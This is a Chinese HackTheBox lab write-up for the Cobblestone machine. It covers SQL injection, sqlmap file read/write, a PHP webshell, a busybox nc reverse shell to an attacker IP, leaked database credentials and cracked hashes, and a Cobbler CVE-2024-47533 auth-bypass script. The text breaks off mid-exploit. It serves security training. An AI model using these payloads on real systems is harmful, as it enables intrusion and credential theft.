{"pageProps":{"postData":{"id":"HackTheBoxSeason8 - Cobblestone","contentHtml":"<h1>Season8 - Cobblestone</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/Cobblestone\">https://app.hackthebox.com/machines/Cobblestone</a> | <code>Linux</code> | <code>Insane</code></p>\n</blockquote>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Cobblestone/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-php\">➜  Cobblestone nmap -sT -min-rate <span class=\"hljs-number\">5000</span> -p- <span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">11.81</span>\nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2025-08-10 10:31 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">11.81</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.069</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp open  ssh\n<span class=\"hljs-number\">80</span>/tcp open  http\n\nNmap done: <span class=\"hljs-number\">1</span> IP <span class=\"hljs-title function_ invoke__\">address</span> (<span class=\"hljs-number\">1</span> host up) scanned in <span class=\"hljs-number\">24.61</span> seconds\n</code></pre>\n<pre><code class=\"hljs language-php\">➜  Cobblestone nmap -sT -A -p <span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">80</span> <span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">11.81</span>       \nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2025-08-10 10:34 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">11.81</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.065</span>s latency).\n\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp open  ssh     OpenSSH <span class=\"hljs-number\">9.2</span>p1 Debian <span class=\"hljs-number\">2</span>+<span class=\"hljs-title function_ invoke__\">deb12u7</span> (protocol <span class=\"hljs-number\">2.0</span>)\n| ssh-hostkey: \n|   <span class=\"hljs-number\">256</span> <span class=\"hljs-number\">50</span>:ef:<span class=\"hljs-number\">5</span>f:db:<span class=\"hljs-number\">82</span>:<span class=\"hljs-number\">03</span>:<span class=\"hljs-number\">36</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">6</span>c:<span class=\"hljs-number\">6</span>b:a6:fc:<span class=\"hljs-number\">3</span>f:<span class=\"hljs-number\">5</span>a:<span class=\"hljs-number\">9</span>f (ECDSA)\n|_  <span class=\"hljs-number\">256</span> e2:<span class=\"hljs-number\">1</span>d:f3:e9:<span class=\"hljs-number\">6</span>a:ce:fb:e0:<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">9</span>b:<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">91</span>:<span class=\"hljs-number\">28</span>:<span class=\"hljs-number\">38</span>:ec:<span class=\"hljs-number\">5</span>d (ED25519)\n<span class=\"hljs-number\">80</span>/tcp open  http    Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">62</span>\n|_http-title: Did not follow redirect to http:<span class=\"hljs-comment\">//cobblestone.htb/</span>\n|_http-server-header: Apache/<span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">62</span> (Debian)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose|router\nRunning: Linux <span class=\"hljs-number\">4</span>.X|<span class=\"hljs-number\">5</span>.X, MikroTik RouterOS <span class=\"hljs-number\">7</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5</span> cpe:/o:mikrotik:routeros:<span class=\"hljs-number\">7</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5.6</span>.<span class=\"hljs-number\">3</span>\nOS details: Linux <span class=\"hljs-number\">4.15</span> - <span class=\"hljs-number\">5.19</span>, MikroTik RouterOS <span class=\"hljs-number\">7.2</span> - <span class=\"hljs-number\">7.5</span> (Linux <span class=\"hljs-number\">5.6</span>.<span class=\"hljs-number\">3</span>)\nNetwork Distance: <span class=\"hljs-number\">2</span> hops\nService Info: Host: <span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span>; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n<span class=\"hljs-title function_ invoke__\">TRACEROUTE</span> (using proto <span class=\"hljs-number\">1</span>/icmp)\nHOP RTT      ADDRESS\n<span class=\"hljs-number\">1</span>   <span class=\"hljs-number\">58.41</span> ms xx.xx.xx.<span class=\"hljs-number\">1</span>\n<span class=\"hljs-number\">2</span>   <span class=\"hljs-number\">58.48</span> ms <span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">11.81</span>\n\nOS <span class=\"hljs-keyword\">and</span> Service detection performed. Please report any incorrect results at https:<span class=\"hljs-comment\">//nmap.org/submit/ .</span>\nNmap done: <span class=\"hljs-number\">1</span> IP <span class=\"hljs-title function_ invoke__\">address</span> (<span class=\"hljs-number\">1</span> host up) scanned in <span class=\"hljs-number\">10.50</span> seconds\n</code></pre>\n<h3>枚举</h3>\n<p><code>80</code> 端口</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Cobblestone/image1.png\" alt=\"image.png\"></p>\n<p>有三个功能，皮肤数据库，vote 投票，Deploy 服务器</p>\n<p>并且 皮肤数据库 和 投票的用户是分开的，两边都要重新注册</p>\n<p>然后这两个功能登录进去后，都有提交 <code>URL</code> 的功能</p>\n<h2>Web</h2>\n<h3>枚举</h3>\n<p>首先测试皮肤数据库，我们提交 <code>Kali</code> 的服务器地址，看它会不会进行访问</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Cobblestone/image2.png\" alt=\"image.png\"></p>\n<p>投票服务器也是同理</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Cobblestone/image3.png\" alt=\"image.png\"></p>\n<p>一会后皮肤服务器会访问链接</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Cobblestone/image4.png\" alt=\"image.png\"></p>\n<p>但是我们指定了文件后却不会对我们进行访问，甚至 <code>png</code> 后缀也是不可以</p>\n<h3>SQL 注入</h3>\n<p>另外在 vote 服务器中，提交 <code>URL</code> 后会回显我们的 <code>URL</code> ，我们对其测试<code>SQL</code> 注入</p>\n<pre><code class=\"hljs language-php\">url=http:<span class=\"hljs-comment\">//xx.xx.xx.8'+and+'aaa'='aaa</span>\n<span class=\"hljs-comment\">// 会不一样</span>\nurl=http:<span class=\"hljs-comment\">//xx.xx.xx.8'+or+'aaa'='aaa</span>\n</code></pre>\n<p>回显：</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Cobblestone/image5.png\" alt=\"image.png\"></p>\n<p>存在 <code>SQL</code> 注入，我们直接上<code>SQLmap</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Cobblestone/image6.png\" alt=\"image.png\"></p>\n<p>扒拉数据</p>\n<pre><code class=\"hljs language-php\">current user: <span class=\"hljs-string\">'voteuser@localhost'</span>\ncurrent database: <span class=\"hljs-string\">'vote'</span>\n+----+----------------+--------------------------------------------------------------+\n| id | username       | password                                                     |\n+----+----------------+--------------------------------------------------------------+\n| <span class=\"hljs-number\">1</span>  | admin          | $<span class=\"hljs-number\">2</span>y$<span class=\"hljs-number\">10</span>$<span class=\"hljs-number\">6</span>XMWgf8RN6McVqmRyFIDb.<span class=\"hljs-number\">6</span>nNALRsA./u4HAF2GIBs3xgZXvZjv86 |\n| <span class=\"hljs-number\">10</span> | test           | $<span class=\"hljs-number\">2</span>y$<span class=\"hljs-number\">10</span><span class=\"hljs-variable\">$lDnE8SLH</span>.dBNTvl7.crkzetQWMCI8ShpwefnjksV5brh4lCKAyMey |\n| <span class=\"hljs-number\">11</span> | Ghost          | $<span class=\"hljs-number\">2</span>y$<span class=\"hljs-number\">10</span><span class=\"hljs-variable\">$De3wkMndB798C</span>/pfFSqSMu5ZE3rBFby/<span class=\"hljs-number\">7</span>uOO.<span class=\"hljs-number\">5</span>Qcl9N1SYxStlLuy |\n| <span class=\"hljs-number\">12</span> | hello          | $<span class=\"hljs-number\">2</span>y$<span class=\"hljs-number\">10</span><span class=\"hljs-variable\">$BgtfoW4Y</span>/hz1fiDy4R9dL.<span class=\"hljs-number\">07</span>zWdNH3QZIiJkIjbSF6BJeq9bz8Kqe |\n| <span class=\"hljs-number\">13</span> | <span class=\"hljs-number\">0</span>xseclab       | $<span class=\"hljs-number\">2</span>y$<span class=\"hljs-number\">10</span><span class=\"hljs-variable\">$eNN</span>.S4LTNVqa8lYVO8EP.eTMYFx.swPixZKWB5YWnj3hbP9YdNAoG |\n| <span class=\"hljs-number\">14</span> | alex           | $<span class=\"hljs-number\">2</span>y$<span class=\"hljs-number\">10</span>$<span class=\"hljs-number\">5</span>IZz3dP0FQzp2wJJf26zp.<span class=\"hljs-number\">4</span>d2Aqw9mdpVnDKXgWNguDVNkw2rSLhe |\n| <span class=\"hljs-number\">15</span> | afewwaefaewf   | $<span class=\"hljs-number\">2</span>y$<span class=\"hljs-number\">10</span><span class=\"hljs-variable\">$nJDo</span>/FmIbyyloSRY0wHWqehn1CVuupONk3V/Qk6FTHp0380Vvwgeq |\n| <span class=\"hljs-number\">16</span> | afewwaefaewfs  | $<span class=\"hljs-number\">2</span>y$<span class=\"hljs-number\">10</span><span class=\"hljs-variable\">$y1uiBLm</span>/l/ASLGu/LcMqU.D6WBPsjmw452HuUjsfksrqjY0YhJlMS |\n| <span class=\"hljs-number\">17</span> | awefafweawfe   | $<span class=\"hljs-number\">2</span>y$<span class=\"hljs-number\">10</span><span class=\"hljs-variable\">$uZaaxRGnmW2y8</span>/S9J6YdsuOAkx2bsB6gA/<span class=\"hljs-number\">69</span>tA8RhZ0l9lO.j6BxK |\n| <span class=\"hljs-number\">18</span> | awawkwakawkawk | $<span class=\"hljs-number\">2</span>y$<span class=\"hljs-number\">10</span><span class=\"hljs-variable\">$P9jU6b2sm8j1aBFQNrA2PeDPKT4VYepf8H5gIRs</span>.VC0CW64JMtooq |\n| <span class=\"hljs-number\">19</span> | sunset         | $<span class=\"hljs-number\">2</span>y$<span class=\"hljs-number\">10</span><span class=\"hljs-variable\">$mcLaZm590V7BQDjdANvSPetWXAAOAAnSDMXzepnwnPNLA8tnbhTZm</span> |\n| <span class=\"hljs-number\">20</span> | s              | $<span class=\"hljs-number\">2</span>y$<span class=\"hljs-number\">10</span><span class=\"hljs-variable\">$vQBH6C8uLkzowxJeA</span>.Hgb.EbBaQx.Gsh74gkpvNC0mKT6pSPK3C.K |\n| <span class=\"hljs-number\">21</span> | eric           | $<span class=\"hljs-number\">2</span>y$<span class=\"hljs-number\">10</span><span class=\"hljs-variable\">$V</span>/UGVlGl7GxjLb/bv2wmquSoIntDHFktGb9OUyDz76OO4tcqjb5um |\n+----+----------------+--------------------------------------------------------------+\n</code></pre>\n<p>破解 <code>admin</code> 密码，无结果</p>\n<p>可以通过通过注入读文件</p>\n<pre><code class=\"hljs language-php\">sqlmap -r packet -batch --file-read=/etc/passwd \n</code></pre>\n<p>存在 <code>john</code> 用户和 <code>cobble</code> 用户</p>\n<pre><code class=\"hljs language-php\">➜  Cobblestone cat /root/.local/share/sqlmap/output/vote.cobblestone.htb/files/_etc_passwd        \nroot:x:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">0</span>:root:/root:/bin/bash\ndaemon:x:<span class=\"hljs-number\">1</span>:<span class=\"hljs-number\">1</span>:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:<span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">2</span>:bin:/bin:/usr/sbin/nologin\nsys:x:<span class=\"hljs-number\">3</span>:<span class=\"hljs-number\">3</span>:sys:/dev:/usr/sbin/nologin\nsync:x:<span class=\"hljs-number\">4</span>:<span class=\"hljs-number\">65534</span>:sync:/bin:/bin/sync\ngames:x:<span class=\"hljs-number\">5</span>:<span class=\"hljs-number\">60</span>:games:/usr/games:/usr/sbin/nologin\nman:x:<span class=\"hljs-number\">6</span>:<span class=\"hljs-number\">12</span>:man:/<span class=\"hljs-keyword\">var</span>/cache/man:/usr/sbin/nologin\nlp:x:<span class=\"hljs-number\">7</span>:<span class=\"hljs-number\">7</span>:lp:/<span class=\"hljs-keyword\">var</span>/spool/lpd:/usr/sbin/nologin\nmail:x:<span class=\"hljs-number\">8</span>:<span class=\"hljs-number\">8</span>:mail:/<span class=\"hljs-keyword\">var</span>/mail:/usr/sbin/nologin\nnews:x:<span class=\"hljs-number\">9</span>:<span class=\"hljs-number\">9</span>:news:/<span class=\"hljs-keyword\">var</span>/spool/news:/usr/sbin/nologin\nuucp:x:<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">10</span>:uucp:/<span class=\"hljs-keyword\">var</span>/spool/uucp:/usr/sbin/nologin\nproxy:x:<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">13</span>:proxy:/bin:/usr/sbin/nologin\nwww-data:x:<span class=\"hljs-number\">33</span>:<span class=\"hljs-number\">33</span>:www-data:/<span class=\"hljs-keyword\">var</span>/www:/usr/sbin/nologin\nbackup:x:<span class=\"hljs-number\">34</span>:<span class=\"hljs-number\">34</span>:backup:/<span class=\"hljs-keyword\">var</span>/backups:/usr/sbin/nologin\n<span class=\"hljs-keyword\">list</span>:x:<span class=\"hljs-number\">38</span>:<span class=\"hljs-number\">38</span>:Mailing List Manager:/<span class=\"hljs-keyword\">var</span>/<span class=\"hljs-keyword\">list</span>:/usr/sbin/nologin\nirc:x:<span class=\"hljs-number\">39</span>:<span class=\"hljs-number\">39</span>:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:<span class=\"hljs-number\">42</span>:<span class=\"hljs-number\">65534</span>::/nonexistent:/usr/sbin/nologin\nnobody:x:<span class=\"hljs-number\">65534</span>:<span class=\"hljs-number\">65534</span>:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:<span class=\"hljs-number\">998</span>:<span class=\"hljs-number\">998</span>:systemd Network Management:/:/usr/sbin/nologin\nsystemd-timesync:x:<span class=\"hljs-number\">997</span>:<span class=\"hljs-number\">997</span>:systemd Time Synchronization:/:/usr/sbin/nologin\nmessagebus:x:<span class=\"hljs-number\">100</span>:<span class=\"hljs-number\">107</span>::/nonexistent:/usr/sbin/nologin\navahi-autoipd:x:<span class=\"hljs-number\">101</span>:<span class=\"hljs-number\">109</span>:Avahi autoip daemon,,,:/<span class=\"hljs-keyword\">var</span>/lib/avahi-autoipd:/usr/sbin/nologin\nsshd:x:<span class=\"hljs-number\">102</span>:<span class=\"hljs-number\">65534</span>::/run/sshd:/usr/sbin/nologin\ncobble:x:<span class=\"hljs-number\">1000</span>:<span class=\"hljs-number\">1000</span>:cobble,,,:/home/cobble:/bin/rbash\nmysql:x:<span class=\"hljs-number\">103</span>:<span class=\"hljs-number\">112</span>:MySQL Server,,,:/nonexistent:/bin/<span class=\"hljs-literal\">false</span>\ntftp:x:<span class=\"hljs-number\">104</span>:<span class=\"hljs-number\">113</span>:tftp daemon,,,:/srv/tftp:/usr/sbin/nologin\n_laurel:x:<span class=\"hljs-number\">999</span>:<span class=\"hljs-number\">996</span>::/<span class=\"hljs-keyword\">var</span>/log/laurel:/bin/<span class=\"hljs-literal\">false</span>\njohn:x:<span class=\"hljs-number\">1001</span>:<span class=\"hljs-number\">1001</span>:,,,:/home/john:/bin/bash\n</code></pre>\n<p>尝试写文件</p>\n<pre><code class=\"hljs language-php\">sqlmap -r packet -batch --file-write=./test.php --file-dest=/<span class=\"hljs-keyword\">var</span>/www/html/test.php\n</code></pre>\n<p>成功写入</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Cobblestone/image7.png\" alt=\"image.png\"></p>\n<p>写入 <code>WebShell</code></p>\n<pre><code class=\"hljs language-php\"><span class=\"hljs-comment\">// test.php</span>\n<span class=\"hljs-meta\">&#x3C;?php</span> <span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-title function_ invoke__\">system</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'x'</span>]));<span class=\"hljs-meta\">?></span>\n<span class=\"hljs-comment\">// 上传</span>\nsqlmap -r packet -batch --file-write=./test.php --file-dest=/<span class=\"hljs-keyword\">var</span>/www/html/test.php\n</code></pre>\n<p>进行反弹 <code>shell</code></p>\n<p>很奇怪，这里只能执行<code>whoami</code> 以及 <code>ls</code> 一些命令，并且我们查看 <code>ls ..</code> 时也会无回显，但是 <code>ls .</code> 却可以，怀疑是 <code>chroot</code> 或者 <code>rbash</code></p>\n<p>并且我们上传到的是 <code>cobblestone.htb</code> 而不是 <code>vote.cobblestone.htb</code> ，可以尝试一下上传到 <code>vote</code></p>\n<pre><code class=\"hljs language-php\">sqlmap -r packet -batch --file-write=./test.php --file-dest=/<span class=\"hljs-keyword\">var</span>/www/vote/test.php\n</code></pre>\n<p>在 <code>vote</code> 中可以访问上层目录</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Cobblestone/image8.png\" alt=\"image.png\"></p>\n<p>反弹 <code>shell</code></p>\n<pre><code class=\"hljs language-php\">busybox+nc+xx.xx.xx.<span class=\"hljs-number\">8</span>+<span class=\"hljs-number\">1234</span>+-e+/bin/bash\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Cobblestone/image9.png\" alt=\"image.png\"></p>\n<p>读取数据库配置文件</p>\n<pre><code class=\"hljs language-php\">www-data@cobblestone:/<span class=\"hljs-keyword\">var</span>/www/html/db$ cat connection.php                \n<span class=\"hljs-meta\">&#x3C;?php</span>\n\n<span class=\"hljs-variable\">$dbserver</span> = <span class=\"hljs-string\">\"localhost\"</span>;\n<span class=\"hljs-variable\">$username</span> = <span class=\"hljs-string\">\"dbuser\"</span>;\n<span class=\"hljs-variable\">$password</span> = <span class=\"hljs-string\">\"aichooDeeYanaekungei9rogi0eMuo2o\"</span>;\n<span class=\"hljs-variable\">$dbname</span> = <span class=\"hljs-string\">\"cobblestone\"</span>;\n\n<span class=\"hljs-variable\">$conn</span> = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title function_ invoke__\">mysqli</span>(<span class=\"hljs-variable\">$dbserver</span>, <span class=\"hljs-variable\">$username</span>, <span class=\"hljs-variable\">$password</span>, <span class=\"hljs-variable\">$dbname</span>);\n\n<span class=\"hljs-comment\">// Check connection</span>\n<span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$conn</span>->connect_errno > <span class=\"hljs-number\">0</span>) {\n    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">\"Connection failed: \"</span> . <span class=\"hljs-variable\">$conn</span>->connect_error);\n}\n<span class=\"hljs-meta\">?></span>\n</code></pre>\n<p>爆一下库</p>\n<pre><code class=\"hljs language-php\">+----+-----------------------+-----------------------+-----------------------+-----------------------------+-------+------------------------------------------------------------------+--------------+\n| id | Username              | FirstName             | LastName              | Email                       | Role  | Password                                                         | register_ip  |\n+----+-----------------------+-----------------------+-----------------------+-----------------------------+-------+------------------------------------------------------------------+--------------+\n|  <span class=\"hljs-number\">1</span> | admin                 | admin                 | admin                 | admin@cobblestone.htb       | admin | f4166d263f25a862fa1b77116693253c24d18a36f5ac597d8a01b10a25c560d1 | *            |\n|  <span class=\"hljs-number\">2</span> | cobble                | cobble                | stone                 | cobble@cobblestone.htb      | admin | <span class=\"hljs-number\">20</span>cdc5073e9e7a7631e9d35b5e1282a4fe6a8049e8a84c82987473321b0a8f4d | *            |\n|  <span class=\"hljs-number\">3</span> | test                  | test                  | test                  | test@testl.com              | user  | <span class=\"hljs-number\">9</span>f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08 | xx.xx.xx.<span class=\"hljs-number\">107</span> |\n|  <span class=\"hljs-number\">4</span> | Ghost                 | ghost                 | ghost                 | test@test.com               | user  | cdc95c699c75297079c1630fabd6f9a98f1c33b2371c6203b901801ce9a2c09f | xx.xx.xx.<span class=\"hljs-number\">106</span> |\n|  <span class=\"hljs-number\">5</span> | alex                  | alex                  | alex12345             | alex@htb.com                | user  | ef797c8118f02dfb649607dd5d3f8c7623048c9c063d532cc95c5ed7a898a64f | <span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">16.58</span>  |\n|  <span class=\"hljs-number\">6</span> | afewfwaeoijwaeffewoij | afewfwaeoijwaeffewoij | afewfwaeoijwaeffewoij | afewfwaeoijwaeffewoij@m.com | user  | <span class=\"hljs-number\">65</span>b4cc3f603bb04224e9c23f28964731b47124f863bed59d38083e84d6dbb450 | xx.xx.xx.<span class=\"hljs-number\">2</span>   |\n|  <span class=\"hljs-number\">7</span> | sunset                | sunset                | sunset                | sunset@q.com                | user  | c09e912cfa0a8c4d82b871c1a25ab367420597c29b12833d0dc1d3ff8ef4a09a | xx.xx.xx.<span class=\"hljs-number\">8</span>   |\n+----+-----------------------+-----------------------+-----------------------+-----------------------------+-------+------------------------------------------------------------------+--------------+\n</code></pre>\n<p>有 <code>cobble</code> 用户，破解一下其密码</p>\n<p>得到密码 <code>iluvdannymorethanyouknow</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Cobblestone/image10.png\" alt=\"image.png\"></p>\n<p>成功登录 <code>SSH</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Cobblestone/image11.png\" alt=\"image.png\"></p>\n<p>并且能读取 <code>user.txt</code></p>\n<pre><code class=\"hljs language-php\">cobble@cobblestone:~$ cat user.txt                                                                                                                                                             \nf86xxxxxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<h2>权限提升</h2>\n<h3>rbash</h3>\n<p>能注意到我们当前 <code>shell</code> 是 <code>rbash</code></p>\n<pre><code class=\"hljs language-php\">cobble@cobblestone:~$ sudo -l                                                                                                                                                                  \n-rbash: sudo: command not found\n</code></pre>\n<p>尝试了一下并无法逃逸，回到 <code>www-data</code>，因为它是正常 <code>bash</code></p>\n<p>然后在 <code>Home</code> 目录能找到 <code>chroot_jail</code> 并且发现 <code>cobble</code> 只能用下边几个命令</p>\n<pre><code class=\"hljs language-php\">www-data@cobblestone:/home/chroot_jail$ ls\nbin  dev  etc  home  lib  lib64  proc\nwww-data@cobblestone:/home/chroot_jail$ cd bin/\nwww-data@cobblestone:/home/chroot_jail/bin$ ls\ncat  grep  ls  ps  rbash  ss\n</code></pre>\n<p>可能还是兔子洞，没找任何方法可以跳出 <code>rbash</code></p>\n<h3>Cobbler</h3>\n<p>我们回到 <code>www-data</code> 进行操作</p>\n<p>查看正在监听端口</p>\n<pre><code class=\"hljs language-php\">www-data@cobblestone:/<span class=\"hljs-keyword\">var</span>/www/vote$ ss -tulpn\nNetid              State               Recv-Q              Send-Q                           Local Address:Port                              Peer Address:Port              Process              \nudp                UNCONN              <span class=\"hljs-number\">0</span>                   <span class=\"hljs-number\">0</span>                                      <span class=\"hljs-number\">0.0</span>.<span class=\"hljs-number\">0.0</span>:<span class=\"hljs-number\">69</span>                                     <span class=\"hljs-number\">0.0</span>.<span class=\"hljs-number\">0.0</span>:*                                      \nudp                UNCONN              <span class=\"hljs-number\">0</span>                   <span class=\"hljs-number\">0</span>                                         [::]:<span class=\"hljs-number\">69</span>                                        [::]:*                                      \ntcp                LISTEN              <span class=\"hljs-number\">0</span>                   <span class=\"hljs-number\">511</span>                                    <span class=\"hljs-number\">0.0</span>.<span class=\"hljs-number\">0.0</span>:<span class=\"hljs-number\">80</span>                                     <span class=\"hljs-number\">0.0</span>.<span class=\"hljs-number\">0.0</span>:*                                      \ntcp                LISTEN              <span class=\"hljs-number\">0</span>                   <span class=\"hljs-number\">128</span>                                    <span class=\"hljs-number\">0.0</span>.<span class=\"hljs-number\">0.0</span>:<span class=\"hljs-number\">22</span>                                     <span class=\"hljs-number\">0.0</span>.<span class=\"hljs-number\">0.0</span>:*                                      \ntcp                LISTEN              <span class=\"hljs-number\">0</span>                   <span class=\"hljs-number\">5</span>                                    <span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span>:<span class=\"hljs-number\">25151</span>                                  <span class=\"hljs-number\">0.0</span>.<span class=\"hljs-number\">0.0</span>:*                                      \ntcp                LISTEN              <span class=\"hljs-number\">0</span>                   <span class=\"hljs-number\">80</span>                                   <span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span>:<span class=\"hljs-number\">3306</span>                                   <span class=\"hljs-number\">0.0</span>.<span class=\"hljs-number\">0.0</span>:*                                      \ntcp                LISTEN              <span class=\"hljs-number\">0</span>                   <span class=\"hljs-number\">128</span>                                       [::]:<span class=\"hljs-number\">22</span>                                        [::]:*\n</code></pre>\n<p>发现本地还开启着 <code>25151</code> 端口，经过查阅，能发现是 <code>cobbler</code> 的 <code>RPC</code> 端口</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Cobblestone/image12.png\" alt=\"image.png\"></p>\n<p>查阅 <code>cobbler</code> 漏洞，能找到 <code>CVE-2024-47533</code></p>\n<blockquote>\n<p><a href=\"https://github.com/cobbler/cobbler/security/advisories/GHSA-m26c-fcgh-cp6h\">https://github.com/cobbler/cobbler/security/advisories/GHSA-m26c-fcgh-cp6h</a></p>\n</blockquote>\n<p>可以利用：</p>\n<pre><code class=\"hljs language-php\">www-data@cobblestone:/tmp$ cat /etc/cobbler/version\n[cobbler]\ngitdate = ?\ngitstamp = ?\nbuilddate = Mon Sep <span class=\"hljs-number\">30</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">40</span>:<span class=\"hljs-number\">50</span> <span class=\"hljs-number\">2024</span>\nversion = <span class=\"hljs-number\">3.3</span>.<span class=\"hljs-number\">6</span>\nversion_tuple = [<span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">6</span>]\n</code></pre>\n<pre><code class=\"hljs language-php\"><span class=\"hljs-comment\">#!/usr/bin/python3</span>\n\nimport ssl\nimport xmlrpc.client\n\nparams = { <span class=\"hljs-string\">'proto'</span>: <span class=\"hljs-string\">'http'</span>, <span class=\"hljs-string\">'host'</span>: <span class=\"hljs-string\">'127.0.0.1'</span>, <span class=\"hljs-string\">'port'</span>: <span class=\"hljs-string\">'25151'</span>, <span class=\"hljs-string\">'username'</span>: <span class=\"hljs-string\">''</span>, <span class=\"hljs-string\">'password'</span>: -<span class=\"hljs-number\">1</span> }\nssl_context = ssl.<span class=\"hljs-title function_ invoke__\">_create_unverified_context</span>()\n\nurl = <span class=\"hljs-string\">'{proto}://{host}:{port}/'</span>.<span class=\"hljs-title function_ invoke__\">format</span>(**params)\n<span class=\"hljs-keyword\">if</span> ssl_context:\n    conn = xmlrpc.client.<span class=\"hljs-title function_ invoke__\">ServerProxy</span>(url, context=ssl_context)\n<span class=\"hljs-keyword\">else</span>:\n    conn = xmlrpc.client.<span class=\"hljs-title function_ invoke__\">Server</span>(url)\n\n<span class=\"hljs-keyword\">try</span>:\n    token = conn.<span class=\"hljs-title function_ invoke__\">login</span>(params[<span class=\"hljs-string\">'username'</span>], params[<span class=\"hljs-string\">'password'</span>])\nexcept xmlrpc.client.Fault <span class=\"hljs-keyword\">as</span> e:\n    <span class=\"hljs-keyword\">print</span>(<span class=\"hljs-string\">\"Failed to log in to Cobbler '{url}' as '{username}'. {error}\"</span>.<span class=\"hljs-title function_ invoke__\">format</span>(url=url, error=e, **params))\nexcept <span class=\"hljs-built_in\">Exception</span> <span class=\"hljs-keyword\">as</span> e:\n    <span class=\"hljs-keyword\">print</span>(<span class=\"hljs-string\">\"Connection to '{url}' failed. {error}\"</span>.<span class=\"hljs-title function_ invoke__\">format</span>(url=url, error=e, **params))\n\n<span class=\"hljs-keyword\">print</span>(<span class=\"hljs-string\">\"Login success!\"</span>)\n\nsystem_id = conn.<span class=\"hljs-title function_ invoke__\">new_system</span>(token)\n\n<span class=\"hljs-keyword\">print</span>(conn.<span class=\"hljs-title function_ invoke__\">get_distros</span>())\n<span class=\"hljs-keyword\">print</span>(conn.<span class=\"hljs-title function_ invoke__\">get_profiles</span>())\n<span class=\"hljs-keyword\">print</span>(conn.<span class=\"hljs-title function_ invoke__\">get_systems</span>())\n<span class=\"hljs-keyword\">print</span>(conn.<span class=\"hljs-title function_ invoke__\">get_images</span>())\n<span class=\"hljs-keyword\">print</span>(conn.<span class=\"hljs-title function_ invoke__\">get_repos</span>())\n</code></pre>\n<p>可以成功登录</p>\n<pre><code class=\"hljs language-php\">www-data@cobblestone:/tmp$ python3 test.py\nLogin success!\n</code></pre>\n<p>现在的思路应该是通过 <code>cobbler</code> 的 <code>RPC</code> 接口进行利用</p>\n<blockquote>\n<p><a href=\"https://github.com/cobbler/cobbler/wiki/XMLRPC-API\">https://github.com/cobbler/cobbler/wiki/XMLRPC-API</a></p>\n</blockquote>\n<p>可以通过 <code>RPC API</code> 创建新实例</p>\n<p>通过恶意调用方法可以造成任意文件读取漏洞</p>\n<p>前面是都是正常的配置，主要的配置是倒数第四和第二行</p>\n<pre><code class=\"hljs language-php\">import xmlrpc.client\n\n<span class=\"hljs-comment\"># 任意</span>\nKERNEL = <span 